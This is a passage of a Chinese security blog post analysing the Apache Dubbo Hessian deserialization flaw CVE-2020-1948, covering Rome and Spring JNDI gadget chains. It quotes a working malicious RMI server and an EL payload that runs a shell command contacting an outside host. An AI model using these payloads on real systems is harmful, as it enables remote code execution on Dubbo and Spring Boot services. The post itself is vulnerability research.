Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2080</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2074</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">92</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)</span><br><span class="line">decode:<span class="number">116</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">73</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decodeBody:<span class="number">132</span>, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">122</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:<span class="number">82</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:<span class="number">48</span>, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">90</span>, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)</span><br><span class="line">decodeRemovalReentryProtection:<span class="number">502</span>, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">callDecode:<span class="number">441</span>, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">channelRead:<span class="number">278</span>, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">invokeChannelRead:<span class="number">374</span>, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:<span class="number">360</span>, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:<span class="number">352</span>, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">channelRead:<span class="number">1408</span>, DefaultChannelPipeline$HeadContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:<span class="number">374</span>, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:<span class="number">360</span>, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:<span class="number">930</span>, DefaultChannelPipeline (io.netty.channel)</span><br><span class="line">read:<span class="number">163</span>, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)</span><br><span class="line">processSelectedKey:<span class="number">682</span>, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeysOptimized:<span class="number">617</span>, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeys:<span class="number">534</span>, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:<span class="number">496</span>, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:<span class="number">906</span>, SingleThreadEventExecutor$<span class="number">5</span> (io.netty.util.concurrent)</span><br><span class="line">run:<span class="number">74</span>, ThreadExecutorMap$<span class="number">2</span> (io.netty.util.internal)</span><br><span class="line">run:<span class="number">30</span>, FastThreadLocalRunnable (io.netty.util.concurrent)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>有了调用栈，看这个问题就比较清晰了，输入的数据在经过多次<code>decode</code>调用后来到了<code>DecodeableRpcInvocation</code>对象的<code>decode(Channel,InputStream)</code>方法中，此时就能看到dubbo使用的是自定义的<code>Hessian2ObjectInput</code>，<code>Hessian2ObjectInput</code>重写了<code>readObject</code>方法调用<code>Hessian2Input</code>的<code>readObject(Class)</code>。经过多次<code>readObject</code>调用后来到<code>MapDeserializer.doReadMap</code>处触发POC中构造的<code>map.put</code>。</p>
<p><img src="/images/210324/Image.png" alt=""></p>
<p><img src="/images/210324/Image%20%5B1%5D.png" alt=""></p>
<p><img src="/images/210324/Image%20%5B2%5D.png" alt=""></p>
<p>之后就是POC中构造好的触发链，调用<code>beanHashCode</code>，<code>beanHashCode</code>调用了<code>this.obj.toString().hashCode()</code>此时的<code>This</code>就是<code>ToStringBean</code>。</p>
<p><img src="/images/210324/Image%20%5B3%5D.png" alt=""></p>
<p><img src="/images/210324/Image%20%5B4%5D.png" alt=""></p>
<p>看完第一个POC的利用链，对于第二个POC是怎样巧妙绕过反序列化步骤直接调用<code>toString</code>就有了更好的理解。也能看到官方issue中对于<code>toString</code>的修复争论属实意义不大，那是针对Rome gadget的一种巧劲利用，并不能实际解决问题，本末倒置了。</p>
<h2 id="CVE-2020-1948实际环境复现"><a href="#CVE-2020-1948实际环境复现" class="headerlink" title="CVE-2020-1948实际环境复现"></a>CVE-2020-1948实际环境复现</h2><h3 id="SpringAbstractBeanFactoryPointcutAdvisor利用"><a href="#SpringAbstractBeanFactoryPointcutAdvisor利用" class="headerlink" title="SpringAbstractBeanFactoryPointcutAdvisor利用"></a>SpringAbstractBeanFactoryPointcutAdvisor利用</h3><p>前面说道Rome这个包在业务上不常用，那开发同事一看，嚯，这个我不用啊，你打不着我，就这吗？一下就让人血压升高了，所以要找找有没有更加广泛的利用方式。<br>在学习这个漏洞的时候有师傅提到过在marshalsec中列举了5个可用的gadget分别是：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Rome</span><br><span class="line">XBean</span><br><span class="line">Resin</span><br><span class="line">SpringPartiallyComparableAdvisorHolder</span><br><span class="line">SpringAbstractBeanFactoryPointcutAdvisor</span><br></pre></td></tr></table></figure>

<p>Rome在之前的复现中已经使用过了，而<code>SpringAbstractBeanFactoryPointcutAdvisor</code>则让人眼前一亮，因为它在Spring-aop依赖包中，也就是说使用了spring就会有这个gadget，利用面一下就扩大了。无巧不成书，在看相关利用的时候发现三梦师傅在GitHub上的一个工具dubbo-exp实现了对<code>SpringAbstractBeanFactoryPointcutAdvisor</code>的利用，赶紧clone下来试试看。<br>设置好参数打一发，ldap payload触发成功。</p>
<p><img src="/images/210302/Image.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B3%5D.png" alt=""></p>
<p>贴一下调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">lookup:<span class="number">202</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">doInContext:<span class="number">155</span>, JndiTemplate$<span class="number">1</span> (org.springframework.jndi)</span><br><span class="line">execute:<span class="number">87</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">152</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">179</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">95</span>, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:<span class="number">218</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:<span class="number">112</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getAdvice:<span class="number">88</span>, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">equals:<span class="number">74</span>, AbstractPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">doReadMap:<span class="number">144</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">125</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2691</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2260</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">74</span>, Hessian2ObjectInput (com.alibaba.dubbo.common.serialize.support.hessian)</span><br><span class="line">decodeHeartbeatData:<span class="number">395</span>, ExchangeCodec (com.alibaba.dubbo.remoting.exchange.codec)</span><br><span class="line">decodeBody:<span class="number">119</span>, DubboCodec (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">120</span>, ExchangeCodec (com.alibaba.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:<span class="number">81</span>, ExchangeCodec (com.alibaba.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:<span class="number">44</span>, DubboCountCodec (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">messageReceived:<span class="number">133</span>, NettyCodecAdapter$InternalDecoder (com.alibaba.dubbo.remoting.transport.netty)</span><br><span class="line">handleUpstream:<span class="number">80</span>, SimpleChannelUpstreamHandler (org.jboss.netty.channel)</span><br><span class="line">sendUpstream:<span class="number">564</span>, DefaultChannelPipeline (org.jboss.netty.channel)</span><br><span class="line">sendUpstream:<span class="number">559</span>, DefaultChannelPipeline (org.jboss.netty.channel)</span><br><span class="line">fireMessageReceived:<span class="number">274</span>, Channels (org.jboss.netty.channel)</span><br><span class="line">fireMessageReceived:<span class="number">261</span>, Channels (org.jboss.netty.channel)</span><br><span class="line">read:<span class="number">349</span>, NioWorker (org.jboss.netty.channel.socket.nio)</span><br><span class="line">processSelectedKeys:<span class="number">280</span>, NioWorker (org.jboss.netty.channel.socket.nio)</span><br><span class="line">run:<span class="number">200</span>, NioWorker (org.jboss.netty.channel.socket.nio)</span><br><span class="line">run:<span class="number">108</span>, ThreadRenamingRunnable (org.jboss.netty.util)</span><br><span class="line">run:<span class="number">44</span>, DeadLockProofWorker$<span class="number">1</span> (org.jboss.netty.util.internal)</span><br><span class="line">runWorker:<span class="number">1142</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>这里我将Java JDNI的几步调用也粘过来，主要是因为spring是直接调用了JRE（JDK）的JNDI，这样子可以更加明显地看到<code>ldapURLContext.lookup</code>这一步。这里主要的调用链是：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lookup:<span class="number">95</span>, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:<span class="number">218</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:<span class="number">112</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getAdvice:<span class="number">88</span>, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">equals:<span class="number">74</span>, AbstractPointcutAdvisor</span><br></pre></td></tr></table></figure>

<p>其他的部分和Rome依赖是一样的，所以我们着重看一下不同的这一部分。在查看利用链前我们先看一下三梦师傅的利用exp。</p>
<p><img src="/images/210302/Image%20%5B35%5D.png" alt=""></p>
<p>入口的前几部主要是读取命令行的属性进行设置，因为我们主要关注对<code>SpringAbstractBeanFactoryPointcutAdvisor</code>的利用，所以其他的就暂时忽略了，在设置属性后，我们主要关注<code>serialization.makeData</code>。</p>
<p><img src="/images/210302/Image%20%5B36%5D.png" alt=""></p>
<p>此处对输出流进行了初始化，随后调用<code>payload.getPayload</code>获取payload，这里的<code>payload</code>对象是<code>SpringAbstractBeanFactoryPointcutAdvisorPoc</code>实例。</p>
<p><img src="/images/210302/Image%20%5B37%5D.png" alt=""></p>
<p>构造待序列化的对象，<code>SpringUtil.makeJNDITrigger</code>中构造JNDI 触发点<code>SimpleJndiBeanFactory</code>与<code>JndiTemplate</code>，<code>SpringUtil.makeBeanFactoryTriggerBFPA</code>中构造<code>DefaultBeanFactoryPointcutAdvisor</code>并封装入<code>HashMap</code>。<br><code>DefaultBeanFactoryPointcutAdvisor</code>继承自<code>AbstractBeanFactoryPointcutAdvisor</code>。这里的payload构造是三梦师傅根据marshalsec项目改造的，dubbo的hessian经过改造所以payload生成师傅也进行了改造，在marshalsec项目中可以查看其原有构造方式。</p>
<p><img src="/images/210302/Image%20%5B38%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B39%5D.png" alt=""></p>
<p>最后将获取的对象封装入hessian输出中。</p>
<p><img src="/images/210302/Image%20%5B41%5D.png" alt=""></p>
<p>在看过payload构造后，就能更清晰地了解这一利用链路了。简单跟进一下利用链，从<code>putVal</code>开始看。</p>
<p><img src="/images/210302/Image%20%5B20%5D.png" alt=""></p>
<p>在图中语句中调用了<code>key</code>的<code>equals</code>方法而我们传入的<code>DefaultBeanFactoryPointcutAdvisor</code>是继承自<code>AbstractBeanFactoryPointcutAdvisor</code>的，<code>AbstractBeanFactoryPointcutAdvisor</code>的父类<code>AbstractPointcutAdvisor</code>重写了<code>equals</code>方法，这里就进入了构造的payload。</p>
<p><img src="/images/210302/Image%20%5B21%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B22%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B23%5D.png" alt=""></p>
<p>可以看到重写的<code>equals</code>方法调用了<code>getAdvice</code>方法，<code>AbstractBeanFactoryPointcutAdvisor</code>重写了<code>getAdvice</code>。</p>
<p><img src="/images/210302/Image%20%5B24%5D.png" alt=""></p>
<p><code>AbstractBeanFactoryPointcutAdvisor.getAdvice</code>调用<code>getBean</code>，从这里开始进入了spring的JNDI调用流程。</p>
<p><img src="/images/210302/Image%20%5B25%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B26%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B27%5D.png" alt=""></p>
<p>最终spring调用了<code>InitialContext.lookup (javax.naming)</code>触发JNDI注入。</p>
<p><img src="/images/210302/Image%20%5B28%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B29%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B30%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B31%5D.png" alt=""></p>
<p>spring官方对于这个问题认为不是他们的问题，spring只是调用了Java的JNDI，所以这个利用方式到现在的spring-framework也是有效的。<br>到这里我们获得了一枚大炮仗，但是找个符合条件的dubbo扔过去，嗯，哑炮。这是因为虽然spring认为这不是他们造成，但是这个Java官方对这个问题进行了修复，在Java8_191官方增加了白名单，不会从外部地址加载任意类，我尝试的环境使用的是271版本自然就无效了。</p>
<h3 id="武器升级"><a href="#武器升级" class="headerlink" title="武器升级"></a>武器升级</h3><p>炮仗成了哑炮自然让人闹心，必须要升级一下炮仗，其实在三梦师傅程序的注释中有提示，可以通过LDAP返回序列化数据，触发本地Gadget。我尝试了一下确实可用，在本地使用Java8_251成功触发payload，但是这需要目标系统中存在其他反序列化gadget，利用受限，不是我们想要的大炮仗。<br>在<a href="https://www.veracode.com/blog/author/michael-stepankin" target="_blank" rel="noopener">Michael Stepankin</a>的<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a>一文中我们找到了我们想要的答案。<br>在JNDI lookup的链路中， 可以在返回的Reference中指定Factory Class，如果本地CLASSPATH存在就不需要从远程加载，而这个类必须实现 <code>javax.naming.spi.ObjectFactory</code> 接口，并且至少存在一个 <code>getObjectInstance</code>方法，<code>javax.naming.spi.NamingManager</code>中调用这个方法。下图可用看到调用过程。</p>
<p><img src="/images/210305/Image%20%5B3%5D.png" alt=""></p>
<p>这里我们看一下作者给出的payload：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServerNew</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Creating evil RMI registry on port 1097"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">        <span class="comment">//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"</span>));</span><br><span class="line"> </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合调用看，<code>javax.naming.spi.NamingManager</code>调用<code>factory</code>也就是<code>org.apache.naming.factory.BeanFactory</code>的<code>getObjectInstance</code>方法，这里<code>BeanFactory</code>传入的Reference需要是<code>ResourceRef</code>。<code>org.apache.naming.factory.BeanFactory</code>存在与tomcat依赖环境中，非常普遍。</p>
<p><img src="/images/210305/Image%20%5B4%5D.png" alt=""></p>
<p><img src="/images/210305/Image%20%5B6%5D.png" alt=""></p>
<p>BeanFactory类创建任意bean的实例，并为所有属性调用其setter进行赋值。目标bean类名、属性和属性值都来自引用对象，对象由攻击者控制。而目标类必须有一个无参构造方法，有public的setter方法且参数为一个String类型。作者指出实际上我们可以为任意属性指定任意的setter。于是作者选择了<code>javax.el.ELProcessor</code>作为目标类，这个类在tomcat8+的环境中存在，也是非常普遍。<br>接下来作者用<code>ELProcessor</code>的<code>eval</code>方法执行EL表达式：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">""</span>.getClass().forName(<span class="string">"javax.script.ScriptEngineManager"</span>).newInstance().getEngineByName(<span class="string">"JavaScript"</span>).eval(<span class="string">"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()"</span>)&#125;</span><br></pre></td></tr></table></figure>

<p>这样就达到了任意命令执行的目的，获得一枚威力加强版炮仗。想到这里我不禁嘴角上扬，本地测试，成功。可以看到我的JRE是1.9_251。</p>
<p><img src="/images/210305/Image.png" alt=""></p>
<p><img src="/images/210305/Image%20%5B1%5D.png" alt=""></p>
<p><img src="/images/210305/Image%20%5B2%5D.png" alt=""></p>
<p>由于在高版本的spring-boot中默认的Web中间件就是tomcat8+所以这个组合的利用范围非常地广泛，实测也确实如此，几乎可以通杀绝大部分spring-boot。之后就是愉快地往同事的环境中种一个flag啦（狗头），因为是敏感信息图这里就不放啦。</p>
<hr>
<p>参考链接：</p>
<p><a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html" target="_blank" rel="noopener">https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html</a><br><a href="https://blog.csdn.net/u011721501/article/details/79443598" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/79443598</a><br><a href="https://y4er.com/post/apache-dubbo-cve-2019-17564/" target="_blank" rel="noopener">https://y4er.com/post/apache-dubbo-cve-2019-17564/</a><br><a href="https://my.oschina.net/u/4593034/blog/4418776" target="_blank" rel="noopener">https://my.oschina.net/u/4593034/blog/4418776</a><br><a href="https://l3yx.github.io/2020/08/25/Apache-Dubbo-反序列化漏洞复现笔记/#CVE-2019-17564" target="_blank" rel="noopener">https://l3yx.github.io/2020/08/25/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/#CVE-2019-17564</a><br><a href="http://www.code2sec.com/cve-2020-1948-dubbo-fan-xu-lie-hua-lou-dong.html" target="_blank" rel="noopener">http://www.code2sec.com/cve-2020-1948-dubbo-fan-xu-lie-hua-lou-dong.html</a><br><a href="https://www.sevenyuan.cn/2020/07/21/java/2020-07-21-dubbo-cve-2020-1948/" target="_blank" rel="noopener">https://www.sevenyuan.cn/2020/07/21/java/2020-07-21-dubbo-cve-2020-1948/</a><br><a href="https://www.anquanke.com/post/id/209251#h3-12" target="_blank" rel="noopener">https://www.anquanke.com/post/id/209251#h3-12</a><br><a href="https://www.freebuf.com/vuls/115849.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/115849.html</a><br><a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">https://xz.aliyun.com/t/6633</a><br><a href="https://threedr3am.github.io/2020/02/14/dubbo%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90-%E9%BB%98%E8%AE%A4dubbo%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E4%B9%8Bhessian2/" target="_blank" rel="noopener">https://threedr3am.github.io/2020/02/14/dubbo%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90-%E9%BB%98%E8%AE%A4dubbo%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E4%B9%8Bhessian2/</a><br><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a><br><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a><br><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">0xSky</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">15</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">0xSky</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
